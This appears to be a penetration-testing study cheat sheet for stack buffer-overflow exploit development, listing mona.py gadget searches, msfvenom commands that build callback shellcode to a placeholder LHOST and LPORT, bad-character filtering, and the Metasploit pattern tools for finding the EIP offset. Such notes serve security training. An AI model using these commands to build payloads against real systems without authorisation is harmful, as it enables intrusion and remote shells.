# [bad chars](https://www.asciitable.com/):
  * test entire ascii range in bytes and figure out which characters are filtered or otherwise mess up a payload

# [mona](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/):
#### `<from Immunity> !mona modules`
#### `<from Immunity> !mona find -s "\xff\xed" -m <dll_name>`
  * shows dlls that you can use to hijack a jmp (or equivalent) command - `jmp esp` or `push espn | retn` are great

# [msfvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/):
#### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows`
#### `msfvenom -p <exploit name> LHOST=X.X.X.X LPORT=YYY -f c -a x86 --platform windows -b "\x00\x0a\x0d"`
  * -p chooses the payload
  * -n prepends a nop sled
  * -a chooses the architecture
  * -b defines bad chars so it won't use them (as a string)
  * -o is the output file
  * -f defines the output format (for instance, a c file)
  * --platform chooses the platform (for instance, windows)
  * LHOST handles the callback ip
  * LPORT handles the callback port

# [nasm_shell](https://guif.re/bo):
#### `ruby /usr/share/metasploit-framework/tools/nasm_shell.rb`
#### `<from nasm> <assembly command>`
  * tells you the opcode for an entered assembly command

# [pattern_create](https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/):
#### `/usr/share/metasploit-framework/tools/pattern_create.rb -l <length>`
  * makes a string with unique patterns for finding where an overflow writes EIP

# [pattern_offset](https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/):
#### `/usr/share/metasploit-framework/tools/pattern_offset -l <length> -q <desired value>`
  * tells you where in your buffer you overflow on to the desired spot (usually EIP)
